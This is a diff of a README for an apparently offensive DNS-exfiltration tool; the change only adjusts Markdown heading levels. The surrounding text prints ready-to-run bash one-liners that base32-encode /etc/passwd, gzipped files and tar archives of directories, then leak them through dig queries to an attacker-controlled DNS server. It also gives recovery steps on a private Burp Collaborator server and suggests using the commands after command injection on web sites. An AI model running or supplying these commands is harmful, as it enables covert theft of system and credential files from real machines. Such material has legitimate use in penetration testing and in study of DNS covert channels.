@@ -22,9 +22,9 @@ Hex encoding is also safe for DNS queries (but is less efficient). I may add hex
 
 Thanks to Xavier Mertens for this excellent Internet Storm Center post: https://isc.sans.edu/diary/DNS+Query+Length...+Because+Size+Does+Matter/22326
 
-Use cases (bash):
+## Use cases (bash):
 
-## Exfiltrate a file:
+### Exfiltrate a file:
 
 ```
 cat /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
@@ -42,7 +42,7 @@ To recover the file (on a private Burp Collaborator server):
 ./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d
 ```
 
-## Exfiltrate a compressed file:
+### Exfiltrate a compressed file:
 
 ```
 cat /etc/passwd | gzip - | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
@@ -60,7 +60,7 @@ To recover/unzip the file (on a private Burp Collaborator server):
 ./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d | zcat 
 ```
 
-## Exfiltrate a compressed tar archive of a directory:
+### Exfiltrate a compressed tar archive of a directory:
 
 Note that exfiltrating /etc on an Ubuntu Linux system worked perfecttly (but took a while). It took 35 minutes, requiring 45,382 DNS requests, resulting in a 1.8 megabyte tar.gz file. Needless to say: the files/directories contained in the archive are restricted by the permissions of the running user. For command injection on web sites (using an account such as apache or www-data), many files/directories will likely be missing.
 
